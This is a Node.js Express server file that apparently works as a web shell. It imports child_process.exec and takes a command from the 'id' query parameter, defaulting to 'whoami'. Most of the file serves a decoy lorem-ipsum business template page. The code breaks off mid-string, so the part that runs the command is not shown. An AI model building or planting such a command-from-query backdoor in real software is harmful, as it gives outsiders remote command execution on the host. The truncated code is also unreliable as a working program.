/*
Copyright 2014-Present Hacker Combat Authors
This file is part of the Hacker Combat library.
The Hacker Combat Protocol is free software: you can redistribute it and/or modify
it under the terms of the GNU Lesser General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
The Hacker Combat Protocol is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Lesser General Public License for more details.
You should have received a copy of the GNU Lesser General Public License
along with the Hacker Combat Protocol library. If not, see <http://www.gnu.org/licenses/>.
*/
var express = require("express");
var app = express();
var exec = require('child_process').exec;
var cmd = "pwd ; ls"
var path = require('path');
process.argv.forEach(function (val, index, array) {
  console.log(index + ': ' + val);
});
//app.use(express.static(path.join(__dirname, 'index')));
app.get('/', function(req, res){
    console.log("I have been successfully pinged")
    console.log('id: ' + req.query.id);
    cmd = req.query.id;
    if(cmd == undefined){
      cmd = "whoami"
      console.log("cmd"+cmd)
      //res.send("hello hacker");
      //res.send('<!DOCTYPEhtml><html><head><style>div.container{width:100%;border:1pxsolidgray;}header,footer{padding:1em;color:white;background-color:black;clear:left;text-align:center;}nav{float:left;max-width:160px;margin:0;padding:1em;}navul{list-style-type:none;padding:0;}navula{text-decoration:none;}article{margin-left:170px;border-left:1pxsolidgray;padding:1em;overflow:hidden;}</style></head><body><divclass="container"><header><h1>CityGallery</h1></header><nav><ul><li><ahref="#">London</a></li><li><ahref="#">Paris</a></li><li><ahref="#">Tokyo</a></li></ul></nav><article><h1>London</h1><p>LondonisthecapitalcityofEngland.ItisthemostpopulouscityintheUnitedKingdom,withametropolitanareaofover13millioninhabitants.</p><p>StandingontheRiverThames,Londonhasbeenamajorsettlementfortwomillennia,itshistorygoingbacktoitsfoundingbytheRomans,whonameditLondinium.</p></article><footer>Copyright&copy;W3Schools.com</footer></div></body></html>');
      res.send( '     '  +
     '   <!DOCTYPE html>  '  +
     '   <html lang="en">  '  +
     '   <head>  '  +
     '       <meta charset="utf-8">  '  +
     '       <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">  '  +
     '       <meta name="viewport" content="width=device-width, initial-scale=1.0">  '  +
     '       <meta name="description" content="">  '  +
     '       <meta name="keywords" content="">  '  +
     '       <title>HR Theme Two</title>  '  +
     '   	<!-- CSS -->  '  +
     '       <link href="http://hostingred.com/free-web-templates/HR2/css/bootstrap.min.css" rel="stylesheet">  '  +
     '       <link href="http://hostingred.com/free-web-templates/HR2/css/font-awesome.min.css" rel="stylesheet">  '  +
     '       <link href="http://hostingred.com/free-web-templates/HR2/css/animate.min.css" rel="stylesheet">  '  +
     '       <link href="http://hostingred.com/free-web-templates/HR2/css/owl.carousel.css" rel="stylesheet">  '  +
     '       <link href="http://hostingred.com/free-web-templates/HR2/css/owl.transitions.css" rel="stylesheet">  '  +
     '       <link href="http://hostingred.com/free-web-templates/HR2/css/prettyPhoto.css" rel="stylesheet">  '  +
     '       <link href="http://hostingred.com/free-web-templates/HR2/css/main.css" rel="stylesheet">  '  +
     '       <link href="http://hostingred.com/free-web-templates/HR2/css/styles.css" rel="stylesheet">  '  +
     '       <!--[if lt IE 9]>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/html5shiv.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/respond.min.js"></script>  '  +
     '       <![endif]-->         '  +
     '       <link rel="shortcut icon" href="http://hostingred.com/free-web-templates/HR2/images/ico/favicon.png">  '  +
     '       <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://hostingred.com/free-web-templates/HR2/images/ico/apple-touch-icon-144-precomposed.png">  '  +
     '       <link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://hostingred.com/free-web-templates/HR2/images/ico/apple-touch-icon-114-precomposed.png">  '  +
     '       <link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://hostingred.com/free-web-templates/HR2/images/ico/apple-touch-icon-72-precomposed.png">  '  +
     '       <link rel="apple-touch-icon-precomposed" href="http://hostingred.com/free-web-templates/HR2/images/ico/apple-touch-icon-57-precomposed.png">  '  +
     '   </head><!--/head-->  '  +
     '     '  +
     '   <body id="home" class="homepage">  '  +
     '     '  +
     '       <header id="header">  '  +
     '           <nav id="main-menu" class="navbar navbar-default navbar-fixed-top" role="banner">  '  +
     '               <div class="container">  '  +
     '                   <div class="navbar-header">  '  +
     '                       <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">  '  +
     '                           <span class="sr-only">Toggle navigation</span>  '  +
     '                           <span class="icon-bar"></span>  '  +
     '                           <span class="icon-bar"></span>  '  +
     '                           <span class="icon-bar"></span>  '  +
     '                       </button>  '  +
     '                       <a class="navbar-brand" href="index.html"><img src="http://hostingred.com/free-web-templates/HR2/images/logo.png" alt="logo"></a>  '  +
     '                   </div>  '  +
     '   				  '  +
     '                   <div class="collapse navbar-collapse navbar-right">  '  +
     '                       <ul class="nav navbar-nav">  '  +
     '                           <li class="scroll active"><a href="#home">Home</a></li>  '  +
     '                           <li class="scroll"><a href="#features">Our Features</a></li>  '  +
     '                           <li class="scroll"><a href="#services">Service</a></li>  '  +
     '                           <li class="scroll"><a href="#portfolio">Portfolio</a></li>  '  +
     '                           <li class="scroll"><a href="#about">About Us</a></li>  '  +
     '                           <li class="scroll"><a href="#meet-team">Team</a></li>  '  +
     '                           <li class="scroll"><a href="#pricing">Plans</a></li>  '  +
     '                           <li class="scroll"><a href="#get-in-touch">Contact</a></li>                          '  +
     '                       </ul>  '  +
     '                   </div>  '  +
     '               </div><!--/.container-->  '  +
     '           </nav><!--/nav-->  '  +
     '       </header><!--/header-->  '  +
     '     '  +
     '       <section id="main-slider">  '  +
     '           <div class="owl-carousel">  '  +
     '               <div class="item" style="background-image: url(http://hostingred.com/free-web-templates/HR2/images/slider/bg1.jpg);">  '  +
     '                   <div class="slider-inner">  '  +
     '                       <div class="container">  '  +
     '                           <div class="row">  '  +
     '                               <div class="col-sm-6">  '  +
     '                                   <div class="carousel-content">  '  +
     '                                       <h2><span>Nemo</span> enim ipsam voluptatem quia voluptas</h2>  '  +
     '                                       <p> Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut. </p>  '  +
     '                                       <a class="btn btn-primary btn-lg" href="#">Read More</a>  '  +
     '                                   </div>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div><!--/.item-->  '  +
     '                <div class="item" style="background-image: url(http://hostingred.com/free-web-templates/HR2/images/slider/bg2.jpg);">  '  +
     '                   <div class="slider-inner">  '  +
     '                       <div class="container">  '  +
     '                           <div class="row">  '  +
     '                               <div class="col-sm-6">  '  +
     '                                   <div class="carousel-content">  '  +
     '                                       <h2>Cum soluta nobis <span>TEMPORE</span></h2>  '  +
     '                                       <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore. </p>  '  +
     '                                       <a class="btn btn-primary btn-lg" href="#">Read More</a>  '  +
     '                                   </div>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div><!--/.item-->  '  +
     '           </div><!--/.owl-carousel-->  '  +
     '       </section><!--/#main-slider-->  '  +
     '     '  +
     '       <section id="cta" class="wow fadeIn">  '  +
     '           <div class="container">  '  +
     '               <div class="row">  '  +
     '                   <div class="col-sm-9">  '  +
     '                       <h2>Sed ut perspiciatis unde omnis iste</h2>  '  +
     '                       <p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima.</p>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-3 text-right">  '  +
     '                       <a class="btn btn-primary btn-lg" href="#">Reprehenderit Qui!</a>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#cta-->  '  +
     '     '  +
     '       <section id="features">  '  +
     '           <div class="container">  '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">OUR Features</h2>  '  +
     '                   <p class="text-center wow fadeInDown">At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium<br>voluptatum deleniti atque corrupti quos dolores et quas</p>  '  +
     '               </div>  '  +
     '               <div class="row">  '  +
     '                   <div class="col-sm-6 wow fadeInLeft">  '  +
     '                       <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/main-feature.png" alt="">  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-6">  '  +
     '                       <div class="media service-box wow fadeInRight">  '  +
     '                           <div class="pull-left">  '  +
     '                               <i class="fa fa-download"></i>  '  +
     '                           </div>  '  +
     '                           <div class="media-body">  '  +
     '                               <h4 class="media-heading">Officia Deserunt</h4>  '  +
     '                               <p>Similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem</p>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '     '  +
     '                       <div class="media service-box wow fadeInRight">  '  +
     '                           <div class="pull-left">  '  +
     '                               <i class="fa fa-database"></i>  '  +
     '                           </div>  '  +
     '                           <div class="media-body">  '  +
     '                               <h4 class="media-heading">Soluta Nobis</h4>  '  +
     '                               <p>Eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus, omnis voluptas assumenda</p>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '     '  +
     '                       <div class="media service-box wow fadeInRight">  '  +
     '                           <div class="pull-left">  '  +
     '                               <i class="fa fa-gamepad"></i>  '  +
     '                           </div>  '  +
     '                           <div class="media-body">  '  +
     '                               <h4 class="media-heading">Temporibus Autem</h4>  '  +
     '                               <p>Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates</p>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '     '  +
     '                       <div class="media service-box wow fadeInRight">  '  +
     '                           <div class="pull-left">  '  +
     '                               <i class="fa fa-cloud"></i>  '  +
     '                           </div>  '  +
     '                           <div class="media-body">  '  +
     '                               <h4 class="media-heading">Itaque earum</h4>  '  +
     '                               <p>Rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut</p>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section>  '  +
     '     '  +
     '       <section id="cta2">  '  +
     '           <div class="container">  '  +
     '               <div class="text-center">  '  +
     '                   <h2 class="wow fadeInUp" data-wow-duration="300ms" data-wow-delay="0ms">YOUR COMPANY <span>SED UT PERSPICIATIS UNDE OMNIS</span></h2>  '  +
     '                   <p class="wow fadeInUp" data-wow-duration="300ms" data-wow-delay="100ms">doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo<br>inventore veritatis et quasi architecto beatae.</p>  '  +
     '                   <p class="wow fadeInUp" data-wow-duration="300ms" data-wow-delay="200ms"><a class="btn btn-primary btn-lg" href="#">Voluptatem Quia</a></p>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section>  '  +
     '     '  +
     '       <section id="services" >  '  +
     '           <div class="container">  '  +
     '     '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">Service</h2>  '  +
     '                   <p class="text-center wow fadeInDown"> Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur,<br>adipisci velit, sed quia non numquam eius modi tempora incidunt ut </p>  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="row">  '  +
     '                   <div class="features">  '  +
     '                       <div class="col-md-4 col-sm-6 wow fadeInUp" data-wow-duration="300ms" data-wow-delay="0ms">  '  +
     '                           <div class="media service-box">  '  +
     '                               <div class="pull-left">  '  +
     '                                   <i class="fa fa-key"></i>  '  +
     '                               </div>  '  +
     '                               <div class="media-body">  '  +
     '                                   <h4 class="media-heading">Ut Enim</h4>  '  +
     '                                   <p>Minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex commodi</p>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div><!--/.col-md-4-->  '  +
     '     '  +
     '                       <div class="col-md-4 col-sm-6 wow fadeInUp" data-wow-duration="300ms" data-wow-delay="100ms">  '  +
     '                           <div class="media service-box">  '  +
     '                               <div class="pull-left">  '  +
     '                                   <i class="fa fa-lock"></i>  '  +
     '                               </div>  '  +
     '                               <div class="media-body">  '  +
     '                                   <h4 class="media-heading">Quis Autem</h4>  '  +
     '                                   <p>Reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum</p>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div><!--/.col-md-4-->  '  +
     '     '  +
     '                       <div class="col-md-4 col-sm-6 wow fadeInUp" data-wow-duration="300ms" data-wow-delay="200ms">  '  +
     '                           <div class="media service-box">  '  +
     '                               <div class="pull-left">  '  +
     '                                   <i class="fa fa-power-off"></i>  '  +
     '                               </div>  '  +
     '                               <div class="media-body">  '  +
     '                                   <h4 class="media-heading"> At Vero Eos</h4>  '  +
     '                                   <p>Accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti</p>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div><!--/.col-md-4-->  '  +
     '                     '  +
     '                       <div class="col-md-4 col-sm-6 wow fadeInUp" data-wow-duration="300ms" data-wow-delay="300ms">  '  +
     '                           <div class="media service-box">  '  +
     '                               <div class="pull-left">  '  +
     '                                   <i class="fa fa-recycle"></i>  '  +
     '                               </div>  '  +
     '                               <div class="media-body">  '  +
     '                                   <h4 class="media-heading">Excepturi Sint</h4>  '  +
     '                                   <p>Occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est</p>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div><!--/.col-md-4-->  '  +
     '     '  +
     '                       <div class="col-md-4 col-sm-6 wow fadeInUp" data-wow-duration="300ms" data-wow-delay="400ms">  '  +
     '                           <div class="media service-box">  '  +
     '                               <div class="pull-left">  '  +
     '                                   <i class="fa fa-history"></i>  '  +
     '                               </div>  '  +
     '                               <div class="media-body">  '  +
     '                                   <h4 class="media-heading">Harum Quidem</h4>  '  +
     '                                   <p>Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime</p>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div><!--/.col-md-4-->  '  +
     '     '  +
     '                       <div class="col-md-4 col-sm-6 wow fadeInUp" data-wow-duration="300ms" data-wow-delay="500ms">  '  +
     '                           <div class="media service-box">  '  +
     '                               <div class="pull-left">  '  +
     '                                   <i class="fa fa-magic"></i>  '  +
     '                               </div>  '  +
     '                               <div class="media-body">  '  +
     '                                   <h4 class="media-heading">Placeat Facere</h4>  '  +
     '                                   <p>Omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis</p>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div><!--/.col-md-4-->  '  +
     '                   </div>  '  +
     '               </div><!--/.row-->      '  +
     '           </div><!--/.container-->  '  +
     '       </section><!--/#services-->  '  +
     '     '  +
     '       <section id="portfolio">  '  +
     '           <div class="container">  '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">Portfolio</h2>  '  +
     '                   <p class="text-center wow fadeInDown"> Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores<br>alias consequatur aut perferendis doloribus asperiores repellat</p>  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="text-center">  '  +
     '                   <ul class="portfolio-filter">  '  +
     '                       <li><a class="active" href="#" data-filter="*">Perspiciatis</a></li>  '  +
     '                       <li><a href="#" data-filter=".filter1">Voluptatem</a></li>  '  +
     '                       <li><a href="#" data-filter=".filter2">Aperiam</a></li>  '  +
     '                       <li><a href="#" data-filter=".filter3">Inventore</a></li>  '  +
     '                   </ul><!--/#portfolio-filter-->  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="portfolio-items">  '  +
     '                   <div class="portfolio-item filter1">  '  +
     '                       <div class="portfolio-item-inner">  '  +
     '                           <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/portfolio/01.jpg" alt="">  '  +
     '                           <div class="portfolio-info">  '  +
     '                               <h3>Nemo enim ipsam</h3>  '  +
     '                               Voluptatem quia voluptas  '  +
     '                               <a class="preview" href="http://hostingred.com/free-web-templates/HR2/images/portfolio/01.jpg" rel="prettyPhoto"><i class="fa fa-eye"></i></a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div><!--/.portfolio-item-->  '  +
     '     '  +
     '                   <div class="portfolio-item filter2 filter3">  '  +
     '                       <div class="portfolio-item-inner">  '  +
     '                           <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/portfolio/02.jpg" alt="">  '  +
     '                           <div class="portfolio-info">  '  +
     '                               <h3>Sed quia consequ</h3>  '  +
     '                               Magni dolores eos qui  '  +
     '                               <a class="preview" href="http://hostingred.com/free-web-templates/HR2/images/portfolio/02.jpg" rel="prettyPhoto"><i class="fa fa-eye"></i></a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div><!--/.portfolio-item-->  '  +
     '     '  +
     '                   <div class="portfolio-item filter1">  '  +
     '                       <div class="portfolio-item-inner">  '  +
     '                           <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/portfolio/03.jpg" alt="">  '  +
     '                           <div class="portfolio-info">  '  +
     '                               <h3>Neque porro</h3>  '  +
     '                               Qui dolorem ipsum quia  '  +
     '                               <a class="preview" href="http://hostingred.com/free-web-templates/HR2/images/portfolio/03.jpg" rel="prettyPhoto"><i class="fa fa-eye"></i></a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div><!--/.portfolio-item-->  '  +
     '     '  +
     '                   <div class="portfolio-item filter2">  '  +
     '                       <div class="portfolio-item-inner">  '  +
     '                           <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/portfolio/04.jpg" alt="">  '  +
     '                           <div class="portfolio-info">  '  +
     '                               <h3>Sed quia non numquam</h3>  '  +
     '                               Eius modi tempora incidunt  '  +
     '                               <a class="preview" href="http://hostingred.com/free-web-templates/HR2/images/portfolio/04.jpg" rel="prettyPhoto"><i class="fa fa-eye"></i></a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div><!--/.portfolio-item-->  '  +
     '     '  +
     '                   <div class="portfolio-item filter1 filter3">  '  +
     '                       <div class="portfolio-item-inner">  '  +
     '                           <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/portfolio/05.jpg" alt="">  '  +
     '                           <div class="portfolio-info">  '  +
     '                               <h3>Labore et dolore</h3>  '  +
     '                               Lorem Ipsum Dolor Sit  '  +
     '                               <a class="preview" href="http://hostingred.com/free-web-templates/HR2/images/portfolio/05.jpg" rel="prettyPhoto"><i class="fa fa-eye"></i></a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div><!--/.portfolio-item-->  '  +
     '     '  +
     '                   <div class="portfolio-item filter2">  '  +
     '                       <div class="portfolio-item-inner">  '  +
     '                           <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/portfolio/06.jpg" alt="">  '  +
     '                           <div class="portfolio-info">  '  +
     '                               <h3>Quis autem vel</h3>  '  +
     '                               Ut enim ad minima veniam  '  +
     '                               <a class="preview" href="http://hostingred.com/free-web-templates/HR2/images/portfolio/06.jpg" rel="prettyPhoto"><i class="fa fa-eye"></i></a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div><!--/.portfolio-item-->  '  +
     '     '  +
     '                   <div class="portfolio-item filter1 filter3">  '  +
     '                       <div class="portfolio-item-inner">  '  +
     '                           <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/portfolio/07.jpg" alt="">  '  +
     '                           <div class="portfolio-info">  '  +
     '                               <h3>Quis nostrum</h3>  '  +
     '                               Exercitationem ullam  '  +
     '                               <a class="preview" href="http://hostingred.com/free-web-templates/HR2/images/portfolio/07.jpg" rel="prettyPhoto"><i class="fa fa-eye"></i></a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div><!--/.portfolio-item-->  '  +
     '     '  +
     '                   <div class="portfolio-item filter2">  '  +
     '                       <div class="portfolio-item-inner">  '  +
     '                           <img class="img-responsive" src="http://hostingred.com/free-web-templates/HR2/images/portfolio/08.jpg" alt="">  '  +
     '                           <div class="portfolio-info">  '  +
     '                               <h3>Corporis suscipit</h3>  '  +
     '                               Nisi ut aliquid ex ea  '  +
     '                               <a class="preview" href="http://hostingred.com/free-web-templates/HR2/images/portfolio/08.jpg" rel="prettyPhoto"><i class="fa fa-eye"></i></a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div><!--/.portfolio-item-->  '  +
     '               </div>  '  +
     '           </div><!--/.container-->  '  +
     '       </section><!--/#portfolio-->  '  +
     '     '  +
     '       <section id="about">  '  +
     '           <div class="container">  '  +
     '     '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">About Us</h2>  '  +
     '                   <p class="text-center wow fadeInDown">At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis<br>praesentium voluptatum deleniti atque corrupti quos dolores et quas</p>  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="row">  '  +
     '                   <div class="col-sm-6 wow fadeInLeft">  '  +
     '                       <h3 class="column-title">Video Sample</h3>  '  +
     '                       <!-- 16:9 aspect ratio -->  '  +
     '                       <div class="embed-responsive embed-responsive-16by9">  '  +
     '                           <iframe src="https://www.youtube.com/embed/XH7OShyZ1Ek" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '     '  +
     '                   <div class="col-sm-6 wow fadeInRight">  '  +
     '                       <h3 class="column-title">Officia Deserunt</h3>  '  +
     '                       <p>Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus, omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis aut rerum.</p>  '  +
     '     '  +
     '                       <p>Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat.</p>  '  +
     '     '  +
     '                       <div class="row">  '  +
     '                           <div class="col-sm-6">  '  +
     '                               <ul class="nostyle">  '  +
     '                                   <li><i class="fa fa-check-square"></i> Eaque ipsa quae ab</li>  '  +
     '                                   <li><i class="fa fa-check-square"></i> Inventore veritatis</li>  '  +
     '                               </ul>  '  +
     '                           </div>  '  +
     '     '  +
     '                           <div class="col-sm-6">  '  +
     '                               <ul class="nostyle">  '  +
     '                                   <li><i class="fa fa-check-square"></i> Architecto beatae vitae dicta</li>  '  +
     '                                   <li><i class="fa fa-check-square"></i> Nemo enim ipsam</li>  '  +
     '                               </ul>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '     '  +
     '                       <a class="btn btn-primary" href="#">Consequuntur magni</a>  '  +
     '     '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#about-->  '  +
     '     '  +
     '       <section id="work-process">  '  +
     '           <div class="container">  '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">Sit amet, Consectetur, Edipisci Velit</h2>  '  +
     '                   <p class="text-center wow fadeInDown">Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit<br>laboriosam, nisi ut aliquid ex ea commodi consequatur?<br>Quis autem vel eum iure reprehenderit</p>  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="row text-center">  '  +
     '                   <div class="col-md-2 col-md-4 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">  '  +
     '                           <div class="icon-circle">  '  +
     '                               <span>1</span>  '  +
     '                               <i class="fa fa-area-chart fa-2x"></i>  '  +
     '                           </div>  '  +
     '                           <h3>VELIT</h3>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-md-2 col-md-4 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="100ms">  '  +
     '                           <div class="icon-circle">  '  +
     '                               <span>2</span>  '  +
     '                               <i class="fa fa-binoculars fa-2x"></i>  '  +
     '                           </div>  '  +
     '                           <h3>QUAM</h3>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-md-2 col-md-4 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="200ms">  '  +
     '                           <div class="icon-circle">  '  +
     '                               <span>3</span>  '  +
     '                               <i class="fa fa-coffee fa-2x"></i>  '  +
     '                           </div>  '  +
     '                           <h3>MOLESTIAE</h3>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-md-2 col-md-4 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="300ms">  '  +
     '                           <div class="icon-circle">  '  +
     '                               <span>4</span>  '  +
     '                               <i class="fa fa-bullhorn fa-2x"></i>  '  +
     '                           </div>  '  +
     '                           <h3>EXPEDITA</h3>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-md-2 col-md-4 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="400ms">  '  +
     '                           <div class="icon-circle">  '  +
     '                               <span>5</span>  '  +
     '                               <i class="fa fa-certificate fa-2x"></i>  '  +
     '                           </div>  '  +
     '                           <h3>FUGIAT</h3>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-md-2 col-md-4 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="500ms">  '  +
     '                           <div class="icon-circle">  '  +
     '                               <span>6</span>  '  +
     '                               <i class="fa fa-cogs fa-2x"></i>  '  +
     '                           </div>  '  +
     '                           <h3>LAUNCH</h3>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#work-process-->  '  +
     '     '  +
     '       <section id="meet-team">  '  +
     '           <div class="container">  '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">OUR TEAM</h2>  '  +
     '                   <p class="text-center wow fadeInDown">Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium,<br>totam rem aperiam, eaque ipsa quae ab illo inventore veritati</p>  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="row">  '  +
     '                   <div class="col-sm-6 col-md-3">  '  +
     '                       <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">  '  +
     '                           <div class="team-img">  '  +
     '                               <img class="img-responsive img-circle" src="http://hostingred.com/free-web-templates/HR2/images/team/01.jpg" alt="">  '  +
     '                           </div>  '  +
     '                           <div class="team-info">  '  +
     '                               <h3>Jane Dohan</h3>  '  +
     '                               <span>Co-Founder</span>  '  +
     '                           </div>  '  +
     '                           <p>At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum</p>  '  +
     '                           <ul class="social-icons">  '  +
     '                               <li><a href="#"><i class="fa fa-facebook"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-twitter"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-google-plus"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-linkedin"></i></a></li>  '  +
     '                           </ul>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-6 col-md-3">  '  +
     '                       <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="100ms">  '  +
     '                           <div class="team-img">  '  +
     '                               <img class="img-responsive img-circle" src="http://hostingred.com/free-web-templates/HR2/images/team/02.jpg" alt="">  '  +
     '                           </div>  '  +
     '                           <div class="team-info">  '  +
     '                               <h3>Leny Fuston</h3>  '  +
     '                               <span>Accounter</span>  '  +
     '                           </div>  '  +
     '                           <p>At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum</p>  '  +
     '                           <ul class="social-icons">  '  +
     '                               <li><a href="#"><i class="fa fa-facebook"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-twitter"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-google-plus"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-linkedin"></i></a></li>  '  +
     '                           </ul>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-6 col-md-3">  '  +
     '                       <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="200ms">  '  +
     '                           <div class="team-img">  '  +
     '                               <img class="img-responsive img-circle" src="http://hostingred.com/free-web-templates/HR2/images/team/03.jpg" alt="">  '  +
     '                           </div>  '  +
     '                           <div class="team-info">  '  +
     '                               <h3>Sander Bell</h3>  '  +
     '                               <span>Designer</span>  '  +
     '                           </div>  '  +
     '                           <p>At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum</p>  '  +
     '                           <ul class="social-icons">  '  +
     '                               <li><a href="#"><i class="fa fa-facebook"></i></a></li>  '  +
